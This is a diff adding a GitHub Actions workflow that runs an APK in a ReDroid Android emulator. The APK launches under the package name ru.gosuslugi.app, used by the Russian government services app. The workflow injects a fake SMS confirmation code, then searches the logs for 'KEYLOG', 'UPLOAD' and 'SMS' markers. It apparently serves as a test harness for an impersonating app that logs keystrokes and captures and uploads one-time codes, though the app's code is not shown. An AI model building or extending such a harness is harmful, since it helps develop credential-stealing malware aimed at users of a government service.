@@ -1,0 +1,43 @@
+name: Docker ReDroid Test
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Install Docker and ADB
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y docker.io android-tools-adb
+
+      - name: Run ReDroid container
+        run: |
+          sudo systemctl start docker
+          sudo docker run -d --name redroid --privileged -p 5555:5555 redroid/redroid:15.0.0_64only-latest
+          sleep 60
+
+      - name: Connect and test
+        run: |
+          adb connect localhost:5555
+          sleep 10
+          adb devices
+          adb install app-debug.apk
+          adb shell am start -n ru.gosuslugi.app/.MainActivity
+          sleep 5
+          adb emu sms send +79001234567 "Код подтверждения: 123456"
+          sleep 5
+          adb logcat -d | grep -E "KEYLOG|UPLOAD|SMS" || echo "Логи не найдены"
+          adb exec-out screencap -p > screenshot.png
+
+      - name: Upload screenshot
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: docker-test-results
+          path: screenshot.png
